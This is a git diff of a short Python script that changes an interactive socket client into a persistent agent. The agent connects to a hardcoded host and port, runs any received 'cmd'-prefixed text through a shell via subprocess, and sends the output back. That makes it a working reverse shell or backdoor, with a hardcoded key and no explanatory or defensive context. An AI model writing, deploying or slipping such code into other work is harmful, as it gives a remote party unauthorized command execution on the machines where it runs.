@@ -1,8 +1,12 @@
+import subprocess
 import socket
 import time
 
 key = 'b3DL7F14d0XOYKxjz5yHchslAItZI0jE'
-timeout = 30
+timeout = 60
+
+host = '192.168.1.71'
+port = 3142
 
 
 def connect():
@@ -22,15 +26,25 @@ def disconnect():
     print('Connection closed')
 
 
-client = socket.socket()
-
-host = '192.168.1.71'
-port = 3142
-
-connect()
-
 while True:
-    msg = input(">")
-    client.send(str.encode(msg, 'utf-8'))
-    response = client.recv(1024)
-    print(response.decode('utf-8'))
+    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    connect()
+
+    while True:
+        msg = client.recv(1024)
+        if len(msg) <= 0:
+            break
+
+        command = msg.decode('utf-8')
+
+        if command.startswith('cmd'):
+            proc = subprocess.Popen(command[4:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            stdout, stderr = proc.communicate()
+            proc.wait()
+
+            client.send(bytes(stdout.decode('cp866'), 'utf-8'))
+
+            if len(stdout) == 0:
+                client.send(bytes(stderr.decode('cp866'), 'utf-8'))
+
+    disconnect()
